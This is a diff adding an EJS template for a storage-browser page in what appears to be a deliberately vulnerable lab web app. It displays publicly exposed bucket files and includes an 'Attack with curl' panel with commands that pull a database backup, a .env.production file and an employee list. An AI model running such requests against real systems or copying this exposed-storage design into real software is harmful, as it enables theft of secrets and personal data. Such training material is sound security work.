@@ -1,0 +1,62 @@
+<%- include('../partials/navbar') %>
+<main class="main-content">
+  <div class="top-header"><span class="header-title">Storage Browser</span>
+    <div class="header-right"><a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a></div>
+  </div>
+  <div class="page-body">
+    <div class="page-header"><h1>syntex-uploads-prod</h1><p>Object storage bucket — file browser.</p></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start;max-width:960px;">
+      <div>
+        <div class="card">
+          <div class="card-header"><h3>Bucket Contents</h3><span class="badge badge-danger">PUBLIC</span></div>
+          <div class="table-wrapper">
+            <table>
+              <thead><tr><th>Object Key</th><th>Size</th><th>Public</th><th></th></tr></thead>
+              <tbody>
+                <% files.forEach(f => { %>
+                <tr style="<%= f.note?'background:var(--danger-bg);':'' %>">
+                  <td style="font-family:monospace;font-size:11px;"><%= f.key %>
+                    <% if(f.note){ %><br><span style="font-size:10px;color:var(--danger);">⚠️ <%= f.note %></span><% } %>
+                  </td>
+                  <td style="font-size:12px;"><%= (f.size/1024).toFixed(1) %>KB</td>
+                  <td><span class="badge badge-<%= f.public?'danger':'success' %>"><%= f.public?'YES':'No' %></span></td>
+                  <td><a href="/storage/file?key=<%= encodeURIComponent(f.key) %>" class="btn btn-primary btn-sm">View</a></td>
+                </tr>
+                <% }) %>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      <div>
+        <% if(content){ %>
+        <div class="card mb-4" style="border-color:var(--danger);">
+          <div class="card-header" style="background:var(--danger-bg);">
+            <h3>📂 <%= filename %></h3><span class="badge badge-danger">EXPOSED</span>
+          </div>
+          <div class="card-body" style="padding:0;">
+            <pre style="font-size:11px;max-height:350px;overflow-y:auto;padding:14px;margin:0;"><%= content %></pre>
+          </div>
+        </div>
+        <% } %>
+        <div class="card">
+          <div class="card-header"><h3>Attack with curl</h3></div>
+          <div class="card-body" style="font-size:12px;">
+            <pre style="font-size:11px;"># Download exposed database backup
+curl "http://syntex.local/storage/file?key=backups/db_backup_2024-11-01.sql" \
+  -H "Cookie: SYNTEX_SESS=SESSION" -o db_backup.sql
+
+# Read .env file
+curl "http://syntex.local/storage/file?key=.env.production&format=json" \
+  -H "Cookie: SYNTEX_SESS=SESSION"
+
+# Get employee data
+curl "http://syntex.local/storage/file?key=internal/employees.csv" \
+  -H "Cookie: SYNTEX_SESS=SESSION"</pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+</div><%- include('../partials/footer') %>
